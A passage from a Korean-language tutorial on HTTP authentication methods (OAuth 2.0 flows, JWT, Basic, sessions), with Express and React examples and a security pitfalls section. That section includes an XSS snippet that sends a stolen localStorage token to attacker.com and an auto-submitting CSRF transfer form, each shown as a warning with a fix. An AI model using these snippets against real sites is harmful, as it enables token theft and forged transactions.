    redirect_uri: REDIRECT_URI,
    response_type: 'code',
    scope: 'openid email profile',  // 요청할 권한
    access_type: 'offline',  // Refresh token 받기
    prompt: 'consent'
  });

  res.redirect(`${authUrl}?${params}`);
});

// 2️⃣ 콜백: 인증 코드를 받아서 토큰 교환
app.get('/auth/google/callback', async (req, res) => {
  const { code } = req.query;

  if (!code) {
    return res.status(400).send('인증 코드가 없습니다');
  }

  try {
    // 인증 코드로 토큰 교환
    const tokenResponse = await axios.post(
      'https://oauth2.googleapis.com/token',
      {
        code,
        client_id: GOOGLE_CLIENT_ID,
        client_secret: GOOGLE_CLIENT_SECRET,
        redirect_uri: REDIRECT_URI,
        grant_type: 'authorization_code'
      }
    );

    const {
      access_token,
      refresh_token,
      expires_in,
      id_token
    } = tokenResponse.data;

    // Access Token으로 사용자 정보 가져오기
    const userInfoResponse = await axios.get(
      'https://www.googleapis.com/oauth2/v2/userinfo',
      {
        headers: {
          Authorization: `Bearer ${access_token}`
        }
      }
    );

    const userInfo = userInfoResponse.data;

    // 사용자 정보를 DB에 저장하고 세션 생성
    // ... (생략)

    res.json({
      message: '로그인 성공',
      user: {
        id: userInfo.id,
        email: userInfo.email,
        name: userInfo.name,
        picture: userInfo.picture
      },
      access_token  // 프론트엔드에 전달
    });
  } catch (error) {
    console.error('OAuth 오류:', error.response?.data || error.message);
    res.status(500).send('인증 실패');
  }
});

// 3️⃣ 보호된 API: Access Token 필요
app.get('/api/profile', async (req, res) => {
  const authHeader = req.headers.authorization;
  const token = authHeader?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: '토큰이 필요합니다' });
  }

  try {
    // Google API로 토큰 검증
    const response = await axios.get(
      'https://www.googleapis.com/oauth2/v2/userinfo',
      {
        headers: { Authorization: `Bearer ${token}` }
      }
    );

    res.json(response.data);
  } catch (error) {
    res.status(401).json({ error: '유효하지 않은 토큰' });
  }
});

app.listen(3000);
```

```jsx
// 클라이언트 코드 (React)
function GoogleLoginButton() {
  const handleLogin = () => {
    // 서버의 OAuth 시작 엔드포인트로 이동
    window.location.href = 'http://localhost:3000/auth/google';
  };

  return (
    <button onClick={handleLogin}>
      <img src="/google-icon.svg" alt="Google" />
      Google로 로그인
    </button>
  );
}

// 콜백 페이지에서 토큰 저장
function OAuthCallback() {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const token = params.get('access_token');

    if (token) {
      localStorage.setItem('google_token', token);
      window.location.href = '/dashboard';
    }
  }, []);

  return <div>로그인 중...</div>;
}
```

### OAuth 2.0 Grant Types (흐름 종류)

#### 1. Authorization Code Flow (가장 안전)

**사용 사례:** 서버가 있는 웹 애플리케이션

```javascript
// 1. 인증 코드 요청
const authUrl = `https://provider.com/oauth/authorize?
  response_type=code&
  client_id=${CLIENT_ID}&
  redirect_uri=${REDIRECT_URI}&
  scope=read write&
  state=${randomState}`;  // CSRF 방지

// 2. 토큰 교환 (서버에서)
const tokenResponse = await axios.post('https://provider.com/oauth/token', {
  grant_type: 'authorization_code',
  code: authorizationCode,
  client_id: CLIENT_ID,
  client_secret: CLIENT_SECRET,  // 서버만 알고 있음
  redirect_uri: REDIRECT_URI
});
```

#### 2. Implicit Flow (덜 안전, 사용 비권장)

**사용 사례:** SPA (Single Page Application), 서버 없음

```javascript
// Access Token을 URL fragment로 즉시 받음
const authUrl = `https://provider.com/oauth/authorize?
  response_type=token&  // 'code'가 아닌 'token'
  client_id=${CLIENT_ID}&
  redirect_uri=${REDIRECT_URI}&
  scope=read`;

// 콜백에서
const token = window.location.hash
  .substring(1)
  .split('&')
  .find(param => param.startsWith('access_token='))
  .split('=')[1];
```

**보안 문제:** Access Token이 URL에 노출됨 → PKCE를 사용한 Authorization Code Flow 권장

#### 3. Client Credentials Flow

**사용 사례:** 서버 간 통신 (사용자 없음)

```javascript
// 서버가 직접 토큰 요청
const tokenResponse = await axios.post(
  'https://provider.com/oauth/token',
  {
    grant_type: 'client_credentials',
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    scope: 'api.read'
  }
);

const accessToken = tokenResponse.data.access_token;

// API 호출
const apiResponse = await axios.get('https://api.provider.com/data', {
  headers: { Authorization: `Bearer ${accessToken}` }
});
```

### OAuth 2.0의 장단점

#### 장점
- **비밀번호 미공유**: 제3자 앱에 비밀번호 노출 없음
- **세밀한 권한 제어**: Scope로 필요한 권한만 요청
- **취소 가능**: 사용자가 언제든 권한 철회 가능
- **표준화**: 대부분의 서비스가 지원

#### 단점
- **복잡성**: 구현이 복잡함
- **설정 필요**: OAuth Provider 등록 필요
- **보안 주의**: 잘못 구현하면 취약점 발생

## 비교 및 선택 가이드

### 인증 방식 비교표

| 특성 | Basic | Bearer (JWT) | Digest | OAuth 2.0 |
|------|-------|-------------|--------|-----------|
| **구현 난이도** | ⭐ 매우 쉬움 | ⭐⭐ 쉬움 | ⭐⭐⭐ 중간 | ⭐⭐⭐⭐ 어려움 |
| **보안 수준** | 낮음 (HTTPS 필수) | 높음 | 중간 | 매우 높음 |
| **HTTPS 필요성** | 필수 | 권장 | 권장 | 필수 |
| **Stateless** | ✅ Yes | ✅ Yes | ❌ No (nonce 관리) | ✅ Yes |
| **로그아웃 지원** | ❌ 없음 | 제한적 | ❌ 없음 | ✅ 있음 |
| **확장성** | 낮음 | 높음 | 낮음 | 높음 |
| **토큰 만료** | ❌ 없음 | ✅ 있음 | ❌ 없음 | ✅ 있음 |
| **브라우저 UI** | 팝업 (제한적) | 커스텀 | 팝업 (제한적) | 커스텀 |
| **주요 사용처** | 내부 도구 | REST API | 레거시 | 제3자 연동 |

### Session vs Token 비교

```
┌─────────────────────────────────────────────────────────────┐
│                     Session 기반 인증                        │
└─────────────────────────────────────────────────────────────┘

클라이언트                서버                    데이터베이스
    |                     |                           |
    |--[1] 로그인-------->|                           |
    |  (username, pw)     |                           |
    |                     |--[2] 세션 생성 ---------->|
    |                     |  (sessionId: {...})       |
    |<--[3] 쿠키 전송-----|                           |
    |  Set-Cookie: sid    |                           |
    |                     |                           |
    |--[4] 요청---------->|                           |
    |  Cookie: sid        |                           |
    |                     |--[5] 세션 조회 ---------->|
    |                     |<--[6] 세션 데이터---------|
    |                     |                           |
    |<--[7] 응답----------|                           |

특징:
✅ 서버가 세션을 완전히 제어 (즉시 취소 가능)
✅ 민감한 정보를 클라이언트에 저장하지 않음
❌ 서버에 상태 저장 필요 (메모리/Redis 사용)
❌ 여러 서버 간 세션 공유 복잡


┌─────────────────────────────────────────────────────────────┐
│                     Token 기반 인증 (JWT)                    │
└─────────────────────────────────────────────────────────────┘

클라이언트                서버
    |                     |
    |--[1] 로그인-------->|
    |  (username, pw)     |
    |                     |
    |<--[2] JWT 발급------|
    |  { token: "eyJ..." }|
    |                     |
    | [클라이언트가 저장]  |
    |                     |
    |--[3] 요청---------->|
    |  Authorization:     |
    |  Bearer eyJ...      |
    |                     |
    |          [JWT 검증 - 서명 확인]
    |                     |
    |<--[4] 응답----------|

특징:
✅ 서버 상태 불필요 (Stateless)
✅ 여러 서버에서 사용 가능
✅ 마이크로서비스에 적합
❌ 토큰 취소 어려움 (블랙리스트 필요)
❌ 토큰 크기가 큼
```

### 언제 어떤 방식을 사용할까?

#### Basic Authentication 사용

```
✅ 적합한 경우:
- 간단한 내부 관리 도구
- 개발/테스트 환경
- 빠른 프로토타입
- 소규모 팀 내부 API

❌ 부적합한 경우:
- 공개 웹 애플리케이션
- 모바일 앱
- 로그아웃이 필요한 경우
- 복잡한 권한 관리
```

**예시:**
```javascript
// 개발 환경 API 문서 보호
if (process.env.NODE_ENV === 'development') {
  app.use('/api-docs', basicAuth({
    users: { 'admin': 'dev-password' },
    challenge: true
  }), swaggerUi.serve);
}
```

#### Bearer Token (JWT) 사용

```
✅ 적합한 경우:
- REST API
- SPA (Single Page Application)
- 모바일 앱
- 마이크로서비스
- 분산 시스템

❌ 부적합한 경우:
- 즉시 로그아웃이 필요한 경우
- 매우 긴 세션이 필요한 경우
- 토큰 크기가 문제가 되는 경우
```

**예시:**
```javascript
// REST API
app.post('/api/posts', authenticateJWT, (req, res) => {
  const userId = req.user.sub;
  // 게시글 생성...
});

// 모바일 앱
const token = await AsyncStorage.getItem('jwt_token');
fetch('/api/profile', {
  headers: { Authorization: `Bearer ${token}` }
});
```

#### OAuth 2.0 사용

```
✅ 적합한 경우:
- 소셜 로그인 (Google, Facebook 등)
- 제3자 API 접근
- 비밀번호를 받고 싶지 않은 경우
- 세밀한 권한 제어가 필요한 경우

❌ 부적합한 경우:
- 간단한 내부 시스템
- OAuth Provider 없는 경우
- 빠른 개발이 필요한 경우
```

**예시:**
```javascript
// 소셜 로그인
<button onClick={() => loginWith('google')}>
  Google로 로그인
</button>
<button onClick={() => loginWith('github')}>
  GitHub로 로그인
</button>

// 제3자 API 접근
// "이 앱이 내 Google Drive에 파일을 저장하도록 허용"
```

## 보안 고려사항과 함정

### 함정 1: HTTPS 없이 인증 사용

```javascript
// ❌ 절대 이렇게 하면 안 됩니다!
// HTTP로 인증 정보 전송
fetch('http://api.example.com/login', {  // http://
  method: 'POST',
  body: JSON.stringify({
    username: 'alice',
    password: 'secret'
  })
});

// 문제:
// - 모든 데이터가 평문으로 전송됨
// - 중간자 공격(MITM)에 취약
// - 공용 WiFi에서 매우 위험

// ✅ 올바른 방법
fetch('https://api.example.com/login', {  // https://
  method: 'POST',
  body: JSON.stringify({
    username: 'alice',
    password: 'secret'
  })
});
```

### 함정 2: JWT를 localStorage에 저장

```javascript
// ❌ XSS 공격에 취약!
localStorage.setItem('token', jwt);

// 악의적인 스크립트가 주입되면
<script>
  // 토큰 탈취
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>

// ✅ 더 안전한 방법들

// 1. httpOnly 쿠키 (서버 코드)
res.cookie('token', jwt, {
  httpOnly: true,     // JavaScript 접근 불가
  secure: true,       // HTTPS만
  sameSite: 'strict'  // CSRF 방어
});

// 2. 메모리에만 저장 (새로고침 시 로그아웃)
let token = null;
function setToken(newToken) {
  token = newToken;
}

// 3. sessionStorage 사용 (탭 닫으면 삭제)
sessionStorage.setItem('token', jwt);
```

### 함정 3: 토큰을 URL에 포함

```javascript
// ❌ 절대 이렇게 하면 안 됩니다!
// 토큰이 브라우저 히스토리, 서버 로그, 리퍼러에 기록됨
fetch(`https://api.example.com/data?token=${jwt}`);

// ✅ 올바른 방법: Authorization 헤더 사용
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${jwt}`
  }
});
```

### 함정 4: 비밀번호를 평문으로 저장

```javascript
// ❌ 절대로 하면 안 됩니다!
const users = {
  alice: { password: 'secret123' }
};

// ✅ bcrypt 사용
const bcrypt = require('bcrypt');

async function registerUser(username, password) {
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  users[username] = { hashedPassword };
}

async function verifyPassword(username, password) {
  const user = users[username];
  return await bcrypt.compare(password, user.hashedPassword);
}
```

### 함정 5: CSRF 공격 무시

```javascript
// ❌ CSRF 공격에 취약
// 쿠키로 인증하는 경우, 악의적인 사이트에서
<form action="https://yoursite.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>

// ✅ CSRF 토큰 사용
// 서버 코드
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF 토큰이 검증된 후에만 실행됨
});

// HTML
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input name="amount" />
  <button type="submit">전송</button>
</form>
```

### 함정 6: 토큰 만료 시간 무제한

```javascript
// ❌ 토큰이 영원히 유효
const token = jwt.sign(userData, SECRET);

// ✅ 적절한 만료 시간 설정
const accessToken = jwt.sign(userData, SECRET, {
  expiresIn: '15m'  // Access Token: 15분
});

const refreshToken = jwt.sign(userData, REFRESH_SECRET, {
  expiresIn: '7d'   // Refresh Token: 7일
});
```

### 보안 체크리스트

```markdown
인증 구현 전 확인사항:

□ HTTPS 사용 (개발 환경 제외)
□ 비밀번호 해시 저장 (bcrypt, Argon2)
□ Salt 사용 (레인보우 테이블 공격 방어)
□ JWT를 localStorage 대신 httpOnly 쿠키 사용
□ CSRF 토큰 구현 (쿠키 기반 인증 시)
□ Rate limiting (무차별 대입 공격 방어)
□ 토큰 만료 시간 설정
□ Refresh Token 패턴 구현
□ 민감한 정보를 JWT에 포함하지 않음
□ CORS 설정 확인
□ Security Headers 설정 (Helmet.js 등)
□ SQL Injection 방어
□ XSS 방어 (입력 sanitization)
□ 에러 메시지에서 정보 노출 방지
□ 로그인 시도 제한
□ 2FA (Two-Factor Authentication) 고려
```

## 실전 활용: 완전한 예제

### 실전 예제 10: 프로덕션 레벨 인증 시스템

```javascript
// ============================================
// 서버: auth.js
// ============================================
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');

const app = express();

// 보안 미들웨어
app.use(helmet());
app.use(cors({
  origin: process.env.CLIENT_URL,
  credentials: true
}));
app.use(express.json());

// Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15분
  max: 5,  // 최대 5회 시도
  message: '너무 많은 로그인 시도입니다. 나중에 다시 시도해주세요.'
});

// 환경 변수
const {
  JWT_ACCESS_SECRET,
  JWT_REFRESH_SECRET,
  NODE_ENV
} = process.env;

// 사용자 데이터베이스 (실제로는 PostgreSQL, MongoDB 등 사용)
const users = new Map();
const refreshTokens = new Set();

// 회원가입
app.post('/api/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;

    // 입력 검증
    if (!username || !email || !password) {
      return res.status(400).json({
        error: '모든 필드를 입력해주세요'
      });
    }

    if (password.length < 8) {
      return res.status(400).json({
        error: '비밀번호는 8자 이상이어야 합니다'
      });
    }

    // 중복 확인
    if (users.has(username)) {
      return res.status(409).json({
        error: '이미 존재하는 사용자명입니다'
      });
    }

    // 비밀번호 해시
    const saltRounds = 12;
    const passwordHash = await bcrypt.hash(password, saltRounds);

    // 사용자 저장
    users.set(username, {
      username,
      email,
      passwordHash,
      createdAt: new Date(),
      role: 'user'
    });

    res.status(201).json({
      message: '회원가입 성공',
      username
    });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({
      error: '서버 오류가 발생했습니다'
    });
  }
});

// 로그인
app.post('/api/login', loginLimiter, async (req, res) => {
  try {
    const { username, password } = req.body;

    // 사용자 확인
    const user = users.get(username);
    if (!user) {
      return res.status(401).json({
        error: '사용자명 또는 비밀번호가 틀렸습니다'
      });
    }

    // 비밀번호 확인
    const isValid = await bcrypt.compare(password, user.passwordHash);
    if (!isValid) {
      return res.status(401).json({
        error: '사용자명 또는 비밀번호가 틀렸습니다'
      });
    }

    // Access Token 생성
    const accessToken = jwt.sign(
      {
        sub: username,
        role: user.role
      },
      JWT_ACCESS_SECRET,
      { expiresIn: '15m' }
    );

    // Refresh Token 생성
    const refreshToken = jwt.sign(
      { sub: username },
      JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );

    refreshTokens.add(refreshToken);

    // httpOnly 쿠키로 Refresh Token 전송
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000  // 7일
    });

    res.json({
      message: '로그인 성공',
      accessToken,
      expiresIn: 900,  // 15분
      user: {
        username: user.username,
        email: user.email,
        role: user.role
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      error: '서버 오류가 발생했습니다'
    });
  }
});

// Access Token 갱신
app.post('/api/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({
      error: 'Refresh token이 없습니다'
    });
  }

  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({
      error: '유효하지 않은 refresh token입니다'
    });
  }

  try {
    const payload = jwt.verify(refreshToken, JWT_REFRESH_SECRET);

    // 새로운 Access Token 발급
    const accessToken = jwt.sign(
      {
        sub: payload.sub,
        role: users.get(payload.sub).role
      },
      JWT_ACCESS_SECRET,
      { expiresIn: '15m' }
    );

    res.json({
      accessToken,
      expiresIn: 900
    });
  } catch (error) {
    return res.status(403).json({
      error: 'Refresh token이 만료되었습니다'
    });
  }
});

// 로그아웃
app.post('/api/logout', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    refreshTokens.delete(refreshToken);
  }

  res.clearCookie('refreshToken');
  res.json({ message: '로그아웃 성공' });
});

// JWT 검증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader?.split(' ')[1];

  if (!token) {
    return res.status(401).json({
      error: '인증 토큰이 필요합니다'
    });
  }

  try {
    const payload = jwt.verify(token, JWT_ACCESS_SECRET);
    req.user = payload;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: '토큰이 만료되었습니다',
        code: 'TOKEN_EXPIRED'
      });
    }
    return res.status(403).json({
      error: '유효하지 않은 토큰입니다'
    });
  }
}

// 권한 확인 미들웨어
function requireRole(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        error: '권한이 없습니다'
      });
    }
    next();
  };
}

// 보호된 라우트
app.get('/api/profile', authenticateToken, (req, res) => {
  const user = users.get(req.user.sub);
  res.json({
    username: user.username,
    email: user.email,
    role: user.role,
    createdAt: user.createdAt
  });
});

// 관리자 전용 라우트
app.get('/api/admin/users',
  authenticateToken,
  requireRole('admin'),
  (req, res) => {
    const allUsers = Array.from(users.values()).map(u => ({
      username: u.username,
      email: u.email,
      role: u.role,
      createdAt: u.createdAt
    }));

    res.json({ users: allUsers });
  }
);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`서버가 포트 ${PORT}에서 실행 중`);
});
```

```jsx
// ============================================
// 클라이언트: AuthContext.jsx
// ============================================
import { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [accessToken, setAccessToken] = useState(null);
  const [loading, setLoading] = useState(true);

  // 컴포넌트 마운트 시 토큰 확인
  useEffect(() => {
    const token = localStorage.getItem('accessToken');
    if (token) {
      setAccessToken(token);
      fetchProfile(token);
    } else {
      setLoading(false);
    }
  }, []);

  // 자동 토큰 갱신
  useEffect(() => {
    if (!accessToken) return;

    // 토큰 만료 5분 전에 갱신
    const payload = JSON.parse(atob(accessToken.split('.')[1]));
    const expiresIn = (payload.exp * 1000) - Date.now();
    const refreshTime = expiresIn - (5 * 60 * 1000);

    if (refreshTime > 0) {
      const timer = setTimeout(() => {
        refreshToken();
      }, refreshTime);

      return () => clearTimeout(timer);
    }
  }, [accessToken]);

  async function fetchProfile(token) {
    try {
      const response = await fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });

      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
      } else {
        localStorage.removeItem('accessToken');
        setAccessToken(null);
      }
    } catch (error) {
      console.error('Profile fetch error:', error);
    } finally {
      setLoading(false);
    }
  }

  async function login(username, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
      credentials: 'include'  // 쿠키 포함
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.error);
    }

    const data = await response.json();
    setAccessToken(data.accessToken);
    setUser(data.user);
    localStorage.setItem('accessToken', data.accessToken);
  }

  async function register(username, email, password) {
    const response = await fetch('/api/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, email, password })
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.error);
    }

    return response.json();
  }

  async function logout() {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });

    setAccessToken(null);
    setUser(null);
    localStorage.removeItem('accessToken');
  }

  async function refreshToken() {
    try {
      const response = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'
      });

      if (response.ok) {
        const data = await response.json();
        setAccessToken(data.accessToken);
        localStorage.setItem('accessToken', data.accessToken);
      } else {
        logout();
      }
    } catch (error) {
      console.error('Token refresh error:', error);
      logout();
    }
  }

  // API 호출 헬퍼
  async function fetchWithAuth(url, options = {}) {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      }
    });

    // 토큰 만료 → 자동 갱신 후 재시도
    if (response.status === 401) {
      const errorData = await response.json();

      if (errorData.code === 'TOKEN_EXPIRED') {
        await refreshToken();

        // 재시도
        return fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${accessToken}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }

    return response;
  }

  const value = {
    user,
    accessToken,
    loading,
    login,
    register,
    logout,
    fetchWithAuth
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}
```

```jsx
// ============================================
// 사용 예시: LoginPage.jsx
// ============================================
import { useState } from 'react';
import { useAuth } from './AuthContext';
import { useNavigate } from 'react-router-dom';

function LoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const { login } = useAuth();
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      await login(username, password);
      navigate('/dashboard');
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <h1>로그인</h1>
      <form onSubmit={handleSubmit}>
        <div>
          <label>사용자명</label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>
        <div>
          <label>비밀번호</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        {error && (
          <div className="error">{error}</div>
        )}
        <button type="submit" disabled={loading}>
          {loading ? '로그인 중...' : '로그인'}
        </button>
      </form>
    </div>
  );
}

// ============================================
// 보호된 라우트: ProtectedRoute.jsx
// ============================================
import { Navigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

function ProtectedRoute({ children, requiredRole }) {
  const { user, loading } = useAuth();

  if (loading) {
    return <div>로딩 중...</div>;
  }

  if (!user) {
    return <Navigate to="/login" />;
  }

  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/forbidden" />;
  }

  return children;
}

// ============================================
// 사용 예시: App.jsx
// ============================================
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { AuthProvider } from './AuthContext';

function App() {
  return (
    <AuthProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/login" element={<LoginPage />} />
          <Route path="/register" element={<RegisterPage />} />

          <Route
            path="/dashboard"
            element={
              <ProtectedRoute>
                <Dashboard />
              </ProtectedRoute>
            }
          />

          <Route
            path="/admin"
            element={
              <ProtectedRoute requiredRole="admin">
                <AdminPanel />
              </ProtectedRoute>
            }
          />
        </Routes>
      </BrowserRouter>
    </AuthProvider>
  );
}
```

## 참고 자료

### RFC 문서 (공식 표준)
- [RFC 7617: Basic HTTP Authentication](https://datatracker.ietf.org/doc/html/rfc7617) - Basic 인증 공식 스펙
- [RFC 7616: Digest HTTP Authentication](https://datatracker.ietf.org/doc/html/rfc7616) - Digest 인증 공식 스펙
- [RFC 7519: JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519) - JWT 공식 스펙
- [RFC 6749: OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749) - OAuth 2.0 공식 스펙
- [RFC 6750: OAuth 2.0 Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750) - Bearer Token 공식 스펙

### MDN 문서
- [HTTP Authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication) - HTTP 인증 개요
- [Authorization Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) - Authorization 헤더
- [WWW-Authenticate](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) - WWW-Authenticate 헤더

### JWT 관련
- [JWT.io](https://jwt.io/) - JWT 디버거 및 라이브러리
- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725) - JWT 보안 모범 사례
- [JWT vs Session Authentication](https://security.stackexchange.com/questions/19676/token-based-authentication-vs-cookies)

### OAuth 2.0 관련
- [OAuth 2.0 Simplified](https://www.oauth.com/) - OAuth 2.0 가이드
- [Google OAuth 2.0 Documentation](https://developers.google.com/identity/protocols/oauth2)
- [GitHub OAuth Apps](https://docs.github.com/en/developers/apps/building-oauth-apps)

### 보안 가이드
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Security Headers](https://securityheaders.com/) - 보안 헤더 검사 도구

### 라이브러리
- [Passport.js](http://www.passportjs.org/) - Node.js 인증 미들웨어
- [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) - JWT 생성/검증
- [bcrypt](https://github.com/kelektiv/node.bcrypt.js) - 비밀번호 해싱
- [express-rate-limit](https://github.com/nfriedly/express-rate-limit) - Rate limiting

### 도구
- [Postman](https://www.postman.com/) - API 테스팅
- [curl](https://curl.se/) - 커맨드라인 HTTP 클라이언트
- [jwt-cli](https://github.com/mike-engel/jwt-cli) - JWT 디버깅 도구
